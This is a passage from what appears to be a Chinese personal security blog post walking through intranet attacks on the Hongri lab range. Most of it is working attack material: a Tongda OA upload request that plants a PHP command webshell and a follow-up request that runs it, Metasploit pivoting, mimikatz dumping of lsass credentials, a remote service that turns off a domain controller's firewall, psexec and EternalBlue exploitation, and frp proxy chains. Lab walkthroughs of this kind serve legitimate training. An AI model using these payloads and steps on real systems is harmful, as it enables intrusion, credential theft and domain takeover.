<p>理论可行，实践不行</p>
<h5 id="docker磁盘挂载ssh连接"><a href="#docker磁盘挂载ssh连接" class="headerlink" title="docker磁盘挂载ssh连接"></a>docker磁盘挂载ssh连接</h5><h3 id="内网2层"><a href="#内网2层" class="headerlink" title="内网2层"></a>内网2层</h3><p>拿web1</p>
<p>主机存活探测+扫端口</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241230193450153.png?raw=true" alt="image-20241230193450153"></p>
<p>防火墙属性，专用配置文件的入站改为允许就可以了，就能在kali上访问52网段了，详细见红日1</p>
<p>win1存在未授权文件上传和文件包含</p>
<p>做个代理，成功证明如下↓</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241231110858666.png?raw=true" alt="image-20241231110858666"></p>
<p>通达oa<strong>通达oa远程命令执行：影响的版本有：V11版，2017版，2016版，2015版，2013增强版，2013版。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/szgyunyun/article/details/107104288</span><br></pre></td></tr></table></figure>

<p>先上传码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: 49.233.3.2:8888</span><br><span class="line">Content-Length: 658</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: PHPSESSID=123</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;P&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">$wsh = new COM(&#x27;WScript.shell&#x27;);</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></pre></td></tr></table></figure>

<p>再执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 49.233.3.2:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2007/422124454.jpg&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241231113723074.png?raw=true" alt="image-20241231113723074"></p>
<h3 id="打域控-1"><a href="#打域控-1" class="headerlink" title="打域控"></a>打域控</h3><h4 id="法一-5"><a href="#法一-5" class="headerlink" title="法一"></a>法一</h4><p>内网主机存活探测</p>
<p>msf路由转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p>主机扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.52.0-255</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535  192.168.183.130</span><br></pre></td></tr></table></figure>

<p>域内成员检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell 进入shell</span><br><span class="line">chcp 65001 消除乱码</span><br><span class="line">net view /domain 查看当前存在几个域</span><br><span class="line">net view /domain:WHOAMIANONY 查看域内所有计算机</span><br><span class="line">ipconfig /all 网卡信息</span><br><span class="line">net group &quot;Domain Controllers&quot; 查找域控制器组</span><br><span class="line">ping 域名得IP</span><br></pre></td></tr></table></figure>

<h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">migrate [pid]   //要lsass.exe的</span><br><span class="line">load kiwi</span><br><span class="line">kiwi_cmd privilege::debug</span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<h4 id="路由添加-打域控"><a href="#路由添加-打域控" class="headerlink" title="路由添加+打域控"></a>路由添加+打域控</h4><h4 id="路由添加"><a href="#路由添加" class="headerlink" title="路由添加"></a>路由添加</h4><p>在meterpreter添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">//获取当前机器的所有网段信息</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.0.0/24 </span><br><span class="line">//添加目标内网0网段的路由，CIDR格式添加</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.0.0 -n 255.255.255.0 </span><br><span class="line">//同样可以自行指定子网掩码进行添加</span><br><span class="line">meterpreter &gt; run autoroute -p </span><br><span class="line">//打印当前添加的路由表信息</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">meterpreter &gt; run autoroute -d -s 192.168.0.0/24  </span><br><span class="line">//删除指定的路由</span><br></pre></td></tr></table></figure>

<p>查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure>
<p>直接拿msf一把索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#接管域控</span><br><span class="line">net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:&quot;Administrator&quot;</span><br><span class="line">#关闭域控防火墙</span><br><span class="line">sc \\192.168.93.30 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.93.30 start unablefirewall</span><br><span class="line">登录域控</span><br><span class="line">关闭防火墙</span><br><span class="line">返回meterpreter添加两条路由:</span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">添加路由</span><br><span class="line">然后使用psexec模块直接登录</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.93.30</span><br><span class="line">set SMBDomain WHOAMIANONY</span><br><span class="line">set SMBPass Whoami2021</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>pc2这么直接永恒之蓝打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg Proxies socks5:192.168.0.110:6000 设置全局代理</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.93.40</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h4 id="法二-4"><a href="#法二-4" class="headerlink" title="法二"></a>法二</h4><p>挂二级代理</p>
<p>①kali</p>
<p>frps.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>②web1-ubuntu</p>
<p>1)frpc2.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.129</span><br><span class="line">server_port = 7000</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.52.10</span><br><span class="line">local_port = 1080</span><br><span class="line">remote_port = 1080</span><br></pre></td></tr></table></figure>

<p>2)frps2.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.52.10</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>③pc1-win7</p>
<p>frpc.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.52.10</span><br><span class="line">server_port = 7000</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process ./frpc.exe -ArgumentList -c ./frpc3.ini</span><br></pre></td></tr></table></figure>

<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>下边是拿下4台主机的session，然后开始黄金票据</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241231130210951.png?raw=true" alt="image-20241231130210951"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241231134353570.png?raw=true" alt="image-20241231134353570"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/280508.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/network/264560.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/2301_79698171/article/details/144508445</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_62334252/article/details/125384701</span><br></pre></td></tr></table></figure>

<p>通达oa↓</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/szgyunyun/article/details/107104288</span><br></pre></td></tr></table></figure>

<p>进程迁移+kiwi↓</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_45588247/article/details/119497964</span><br></pre></td></tr></table></figure>

<p>msf自带的route模块穿透↓</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pingmaoer.github.io/2020/05/09/%E5%88%A9%E7%94%A8msf%E8%87%AA%E5%B8%A6%E7%9A%84route%E6%A8%A1%E5%9D%97%E7%A9%BF%E9%80%8F%E7%9B%AE%E6%A0%87%E5%86%85%E7%BD%91/</span><br></pre></td></tr></table></figure>


</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">http://example.com/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/6intranet/">6intranet</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a><a class="pagination-related" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">24强网杯</div></div><div class="info-2"><div class="info-item-1">24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from flask import Flask, request, jsonifyimport reimport unidecodeimport stringimport astimport sysimport...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1"><span class="toc-number">1.</span> <span class="toc-text">+红日靶场1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%93"><span class="toc-number">1.2.</span> <span class="toc-text">开打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80rogue-mysql"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">一rogue_mysql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">二 数据库弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99%E7%A0%81"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">日志写码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89yxcms"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">三yxcms</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dirmap"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">dirmap</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E7%9B%B4%E6%8E%A5%E6%89%93"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">四永恒之蓝直接打</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">内网</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">法一</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%8A%A8msf"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">联动msf</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">法二</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cs"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">cs</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.2.3.</span> <span class="toc-text">开远程桌面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2"><span class="toc-number">2.</span> <span class="toc-text">+红日靶场2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">2.2.</span> <span class="toc-text">网卡配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DHCP"><span class="toc-number">2.2.1.</span> <span class="toc-text">DHCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vm"><span class="toc-number">2.2.2.</span> <span class="toc-text">vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9C%BA%E6%97%A0%E6%B3%95ping-web%E6%9C%BA%E5%92%8Cpc%E6%9C%BA"><span class="toc-number">2.2.3.</span> <span class="toc-text">域控机无法ping web机和pc机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%93-1"><span class="toc-number">2.3.</span> <span class="toc-text">开打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#disearch"><span class="toc-number">2.3.1.</span> <span class="toc-text">disearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">cs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf"><span class="toc-number">2.3.3.</span> <span class="toc-text">msf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="toc-number">2.3.4.</span> <span class="toc-text">获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-2"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-2"><span class="toc-number">2.3.4.2.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">2.3.4.3.</span> <span class="toc-text">法三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E5%9B%9B"><span class="toc-number">2.3.4.4.</span> <span class="toc-text">法四</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B9%E7%BB%99cs"><span class="toc-number">2.3.5.</span> <span class="toc-text">弹给cs</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-3"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-3"><span class="toc-number">2.3.5.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.3.7.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-4"><span class="toc-number">2.3.7.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B4%BB-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.3.7.2.</span> <span class="toc-text">内网主机探活+端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3%E3%80%82%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95psexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%99%BB%E5%BD%95DC"><span class="toc-number">2.3.7.3.</span> <span class="toc-text">445端口。可以尝试psexec横向移动登录DC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8DC%E8%BF%9B%E5%85%A5%E5%85%B6%E4%BB%96%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">2.3.7.4.</span> <span class="toc-text">用DC进入其他域用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-%E6%9C%AA%E6%88%90%E5%8A%9F"><span class="toc-number">2.3.7.5.</span> <span class="toc-text">法二-未成功</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.4.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.4.1.</span> <span class="toc-text">生成黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E8%B4%A6%E6%88%B7"><span class="toc-number">2.4.2.</span> <span class="toc-text">添加域管账户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">2.5.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3"><span class="toc-number">3.</span> <span class="toc-text">+红日靶场3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.1.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4"><span class="toc-number">4.</span> <span class="toc-text">+红日靶场4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 